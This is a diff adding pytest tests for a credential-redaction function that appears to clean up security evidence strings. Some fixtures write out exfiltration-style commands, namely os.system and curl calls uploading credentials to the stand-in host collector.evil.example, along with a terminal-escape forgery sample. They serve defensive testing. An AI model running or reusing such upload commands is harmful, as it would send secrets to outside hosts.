@@ -1451,3 +1451,96 @@ def test_similarly_named_process_option_is_not_treated_as_a_password() -> None:
     redacted = redact_evidence_string(text, max_chars=1000)
 
     assert "--password-policy strict" in redacted
+
+
+@pytest.mark.parametrize(
+    ("text", "secret", "expected_context"),
+    [
+        (
+            'os.system("psql postgresql://alice:hunter2@db.example/prod")',
+            "hunter2",
+            "postgresql://<credentials-redacted>@db.example/prod",
+        ),
+        (
+            r'os.system("curl https:\/\/alice:hunter3@collector.evil.example/upload")',
+            "hunter3",
+            "https://<credentials-redacted>@collector.evil.example/upload",
+        ),
+    ],
+)
+def test_redacts_generic_and_serialized_url_credentials(text: str, secret: str, expected_context: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert secret not in redacted
+    assert expected_context in redacted
+
+
+@pytest.mark.parametrize(
+    ("key", "secret"),
+    [
+        ("AWS_ACCESS_KEY_ID", "AKIAIOSFODNN7EXAMPLE"),
+        ("session_id", "session-value-7"),
+        ("jwt", "header.payload.signature"),
+        ("passphrase", "correct-horse-battery-staple"),
+        ("pwd", "hunter4"),
+    ],
+)
+def test_redacts_common_credential_assignment_names(key: str, secret: str) -> None:
+    redacted = redact_evidence_string(f'{key}={secret} os.system("id")', max_chars=500)
+
+    assert secret not in redacted
+    assert f"{key}={REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "os.system" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "access_key_identifier=public-name",
+        "session_tokenizer=bert-base",
+        "jwt_algorithm=RS256",
+        'os.system("pwd /workspace")',
+    ],
+)
+def test_similarly_named_credential_keys_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=500) == text
+
+
+def test_redacts_ansi_quoted_command_credentials() -> None:
+    text = "curl --password $'hunter5' --proxy-user $'alice:hunter6' https://collector.evil.example/upload"
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "hunter5" not in redacted
+    assert "hunter6" not in redacted
+    assert "curl" in redacted
+    assert "collector.evil.example" in redacted
+
+
+def test_escapes_control_and_format_characters_in_evidence() -> None:
+    text = 'os.system("id")\x1b[2J\nFORGED\u202eOUTPUT'
+
+    redacted = redact_evidence_string(text, max_chars=500)
+
+    assert "\x1b" not in redacted
+    assert "\n" not in redacted
+    assert "\u202e" not in redacted
+    assert r"\u001b" in redacted
+    assert r"\n" in redacted
+    assert r"\u202e" in redacted
+
+
+def test_redaction_bounds_expensive_command_processing(monkeypatch: pytest.MonkeyPatch) -> None:
+    processed_lengths: list[int] = []
+    original = evidence_redaction._redact_command_context_tokens
+
+    def record_length(text: str) -> str:
+        processed_lengths.append(len(text))
+        return original(text)
+
+    monkeypatch.setattr(evidence_redaction, "_redact_command_context_tokens", record_length)
+
+    redact_evidence_string('os.system("id") ' * 700_000, max_chars=160)
+
+    assert processed_lengths
+    assert max(processed_lengths) <= 160 + evidence_redaction.EVIDENCE_REDACTION_LOOKAHEAD_CHARS
